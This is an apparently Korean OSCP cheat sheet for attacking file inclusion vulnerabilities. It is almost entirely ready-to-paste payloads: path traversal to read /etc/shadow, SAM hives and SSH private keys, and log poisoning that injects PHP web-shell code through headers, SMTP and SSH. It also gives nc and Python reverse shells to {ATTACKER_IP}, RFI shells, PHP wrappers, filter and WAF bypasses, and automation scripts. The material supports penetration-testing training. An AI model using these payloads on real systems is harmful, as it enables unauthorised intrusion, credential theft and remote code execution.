# File Inclusion (LFI/RFI) - OSCP 공격 가이드

> **목표: 파일 포함 취약점을 통한 정보 수집 → 코드 실행 → 쉘 획득**

## ⚡ 기본 페이로드들 (즉시 복사-붙여넣기)

### 🔍 기본 LFI 테스트

```bash
# 기본 LFI 페이로드 (리눅스)
../../../../../../../etc/passwd
../../../../../../../etc/shadow
../../../../../../../etc/hosts
../../../../../../../etc/issue
../../../../../../../proc/version
../../../../../../../proc/cmdline

# 기본 LFI 페이로드 (윈도우)
..\..\..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\..\..\windows\system32\config\sam
..\..\..\..\..\..\windows\win.ini
..\..\..\..\..\..\windows\system32\config\system
..\..\..\..\..\..\windows\repair\sam
..\..\..\..\..\..\windows\php.ini

# 웹 서버 설정 파일
../../../../../../../etc/apache2/apache2.conf
../../../../../../../etc/nginx/nginx.conf
../../../../../../../var/log/apache2/access.log
../../../../../../../var/log/nginx/access.log
../../../../../../../etc/httpd/conf/httpd.conf
```

### 🌐 RFI 기본 테스트

```bash
# 기본 RFI 페이로드
http://{ATTACKER_IP}/shell.php
https://{ATTACKER_IP}/shell.php
ftp://{ATTACKER_IP}/shell.php
///{ATTACKER_IP}/shell.php
\\{ATTACKER_IP}\shell.php

# 외부 쉘 URL (테스트용)
http://www.google.com/humans.txt
https://pastebin.com/raw/
https://github.com/user/repo/raw/main/shell.php
```

### 📄 중요 파일 위치

```bash
# SSH 키 파일
../../../../../../../home/{USER}/.ssh/id_rsa
../../../../../../../home/{USER}/.ssh/id_dsa
../../../../../../../home/{USER}/.ssh/authorized_keys
../../../../../../../root/.ssh/id_rsa

# 웹 애플리케이션 설정
../../../../../../../var/www/html/config.php
../../../../../../../var/www/html/wp-config.php
../../../../../../../var/www/html/configuration.php
../../../../../../../var/www/html/.env

# 데이터베이스 설정
../../../../../../../etc/mysql/my.cnf
../../../../../../../var/lib/mysql/mysql/user.MYD
```

## 🎯 상황별 페이로드

### 📝 Log Poisoning (가장 효과적)

```bash
# 1. Apache 로그 접근 확인
../../../../../../../var/log/apache2/access.log
../../../../../../../var/log/httpd/access_log
../../../../../../../var/log/httpd/error_log

# 2. User-Agent 포이즈닝
curl -A "<?php system(\$_GET['cmd']); ?>" http://{TARGET_IP}/

# 3. 로그 포이즈닝된 파일 접근
../../../../../../../var/log/apache2/access.log&cmd=whoami
../../../../../../../var/log/apache2/access.log&cmd=id
../../../../../../../var/log/apache2/access.log&cmd=cat%20/etc/passwd

# 4. 리버스 쉘
../../../../../../../var/log/apache2/access.log&cmd=nc%20-e%20/bin/sh%20{ATTACKER_IP}%20443
../../../../../../../var/log/apache2/access.log&cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])%27
```

### 🔧 PHP Wrapper 활용

```bash
# Base64 인코딩으로 소스코드 읽기
php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd
php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/config.php
php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/index.php

# 압축 필터 사용
php://filter/zlib.deflate/convert.base64-encode/resource=../../../../../../../etc/passwd

# ROT13 인코딩
php://filter/read=string.rot13/resource=../../../../../../../etc/passwd

# PHP input 스트림 (POST 데이터)
php://input
```

### 📧 메일 로그 포이즈닝

```bash
# 1. 메일 로그 확인
../../../../../../../var/log/mail.log
../../../../../../../var/spool/mail/www-data

# 2. 메일 전송으로 포이즈닝
telnet {TARGET_IP} 25
MAIL FROM: <?php system($_GET['cmd']); ?>
QUIT

# 3. 포이즈닝된 로그 접근
../../../../../../../var/log/mail.log&cmd=whoami
```

### 🗂️ RFI 쉘 업로드

```bash
# 1. 공격자 서버에 쉘 파일 준비
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80

# 2. RFI로 쉘 실행
http://{ATTACKER_IP}/shell.php&cmd=whoami
http://{ATTACKER_IP}/shell.php&cmd=id
http://{ATTACKER_IP}/shell.php&cmd=cat%20/etc/passwd

# 3. 리버스 쉘
http://{ATTACKER_IP}/shell.php&cmd=nc%20-e%20/bin/sh%20{ATTACKER_IP}%20443
```

## 🔄 우회 기법들

### 🚫 경로 순회 필터 우회

```bash
# 점과 슬래시 필터 우회
....//....//....//....//....//....//etc/passwd
..\/..\/..\/..\/..\/..\/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%etc%2fpasswd

# Null byte 우회 (구버전 PHP)
../../../../../../../etc/passwd%00
../../../../../../../etc/passwd%00.jpg

# 이중 인코딩
%252e%252e%252f%252e%252e%252f%252e%252e%252f%etc%252fpasswd

# 유니코드 우회
..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
```

### 🔤 확장자 필터 우회

```bash
# 확장자가 자동으로 붙는 경우
../../../../../../../etc/passwd/.
../../../../../../../etc/passwd/./
../../../../../../../etc/passwd%00
../../../../../../../etc/passwd?
../../../../../../../etc/passwd#

# PHP wrapper로 우회
php://filter/resource=../../../../../../../etc/passwd
expect://id
data://text/plain,<?php system($_GET['cmd']); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### 🛡️ WAF/필터 우회

```bash
# 키워드 필터 우회
../../../../../../../e%74c/p%61sswd
../../../../../../../etc/pass%77d
../../../../../../../etc/pas'+'swd

# 경로 정규화 우회
../../../../../../../etc/./passwd
../../../../../../../etc/passwd/.
../../../../../../../etc//passwd

# 대소문자 우회
../../../../../../../ETC/PASSWD
../../../../../../../Etc/Passwd

# 특수문자 삽입
..././..././..././..././etc/passwd
..\\..\\..\\..\\..\\..\\.\\etc\\passwd
```

### 🌐 RFI 우회 기법

```bash
# 프로토콜 우회
ftp://{ATTACKER_IP}/shell.php
tftp://{ATTACKER_IP}/shell.php
ldap://{ATTACKER_IP}/shell.php

# 포트 변경
http://{ATTACKER_IP}:8080/shell.php
https://{ATTACKER_IP}:8443/shell.php

# IP 인코딩
http://2130706433/shell.php  # 127.0.0.1의 10진수
http://0x7f000001/shell.php  # 127.0.0.1의 16진수
```

## 🤖 자동화 도구 명령어

### 🔍 DotDotPwn

```bash
# 기본 스캔
dotdotpwn -m http -h {TARGET_IP} -M GET -o unix

# 특정 파라미터 테스트
dotdotpwn -m http -h {TARGET_IP} -M GET -o unix -f /etc/passwd -k "file="

# POST 메소드로 테스트
dotdotpwn -m http -h {TARGET_IP} -M POST -o unix -d "file=TRAVERSAL"

# 워드리스트 사용
dotdotpwn -m http -h {TARGET_IP} -M GET -o unix -S -t 300 -f /etc/passwd
```

### 🕷️ Burp Suite Extension

```bash
# LFI Scanner 사용법
1. Burp Suite > Extender > BApp Store > LFI Scanner 설치
2. Target > Site map > 우클릭 > Extensions > LFI Scanner
3. 자동으로 LFI 취약점 테스트 수행

# Manual Testing with Burp Intruder
1. 파라미터 선택 후 Send to Intruder
2. Payload Lists에 ../../../../../../../etc/passwd 등 추가
3. Attack 실행 후 길이 차이로 성공 여부 확인
```

### 🔧 커스텀 스크립트

```bash
# LFI 자동 테스트 스크립트
#!/bin/bash
TARGET="$1"
PARAM="$2"

PAYLOADS=(
    "../../../../../../../etc/passwd"
    "../../../../../../../etc/shadow"
    "../../../../../../../var/log/apache2/access.log"
    "php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd"
)

for payload in "${PAYLOADS[@]}"; do
    echo "[+] Testing: $payload"
    curl -s "$TARGET?$PARAM=$payload" | grep -E "(root:|www-data:|daemon:)" && echo "[SUCCESS] $payload"
done
```

### 🐍 Python 스크립트

```python
#!/usr/bin/env python3
import requests
import sys

def test_lfi(url, param):
    payloads = [
        "../../../../../../../etc/passwd",
        "../../../../../../../etc/shadow",
        "php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd",
        "../../../../../../../var/log/apache2/access.log"
    ]

    for payload in payloads:
        try:
            r = requests.get(f"{url}?{param}={payload}", timeout=10)
            if "root:" in r.text or "www-data:" in r.text:
                print(f"[SUCCESS] {payload}")
                print(f"Response: {r.text[:200]}...")
        except:
            pass

if __name__ == "__main__":
    test_lfi(sys.argv[1], sys.argv[2])
```

## 🚨 문제 해결

### ❌ LFI가 안 될 때

```bash
# 1. 다른 파라미터 확인
?file=test
?page=test
?include=test
?path=test
?template=test
?doc=test

# 2. 다른 경로 시도
/etc/passwd
etc/passwd
../../../../etc/passwd
..//..//..//..//etc//passwd

# 3. 다른 중요 파일들
/etc/issue
/etc/hostname
/etc/os-release
/proc/self/environ
/proc/version
/proc/cmdline

# 4. 웹 서버별 로그 위치
# Apache
/var/log/apache2/access.log
/var/log/httpd/access_log
/usr/local/apache/logs/access_log

# Nginx
/var/log/nginx/access.log
/var/log/nginx/error.log
```

### 🔄 RFI가 안 될 때

```bash
# 1. allow_url_include 확인
php://filter/convert.base64-encode/resource=../../../../../../../etc/php/7.4/apache2/php.ini

# 2. 다른 프로토콜 시도
ftp://{ATTACKER_IP}/shell.txt
tftp://{ATTACKER_IP}/shell.txt
\\{ATTACKER_IP}\share\shell.txt

# 3. 포트 변경
http://{ATTACKER_IP}:8080/shell.php
http://{ATTACKER_IP}:3000/shell.php

# 4. 외부 서비스 활용
https://pastebin.com/raw/xxxxxxxx
https://gist.githubusercontent.com/user/xxx/raw/shell.php
```

### 🛠️ 로그 포이즈닝이 안 될 때

```bash
# 1. 다른 로그 파일 시도
/var/log/auth.log (SSH 로그)
/var/log/vsftpd.log (FTP 로그)
/var/log/mail.log (메일 로그)

# 2. SSH 로그 포이즈닝
ssh '<?php system($_GET[cmd]); ?>'@{TARGET_IP}

# 3. 다른 헤더로 포이즈닝
curl -H "X-Forwarded-For: <?php system(\$_GET['cmd']); ?>" http://{TARGET_IP}/

# 4. 쿠키 포이즈닝
curl --cookie "user=<?php system(\$_GET['cmd']); ?>" http://{TARGET_IP}/
```

### 🔍 필터가 강할 때

```bash
# 1. 다층 인코딩
%252e%252e%252f  (이중 URL 인코딩)

# 2. 다른 wrapper 시도
compress.zlib://
compress.bzip2://
zip://

# 3. 세션 파일 읽기
/tmp/sess_{SESSION_ID}
/var/lib/php/sessions/sess_{SESSION_ID}

# 4. proc 파일시스템 활용
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/self/environ
```

## 📊 성공 판정 기준

### ✅ LFI 성공 확인

- `/etc/passwd` 내용 확인: `root:x:0:0:` 포함
- 로그 파일 읽기: Apache/Nginx 로그 형식 확인
- 설정 파일: `<?php` 또는 설정 값들 확인
- Base64 인코딩: 디코딩 후 의미있는 내용 확인

### ✅ RFI 성공 확인

- 외부 파일 실행: `phpinfo()` 결과 표시
- 쉘 실행: `whoami`, `id` 명령어 결과
- 에러 메시지: 외부 URL 접근 시도 확인

### ⏰ 시간 관리

- **5분**: 기본 LFI 페이로드 테스트
- **15분**: 로그 포이즈닝 + RFI 시도
- **25분**: 고급 우회 기법 + wrapper 활용
- **30분**: 다른 공격으로 전환

**성공시 즉시 쉘 획득으로 이동!** → `SHELLS/reverse-shells.md`
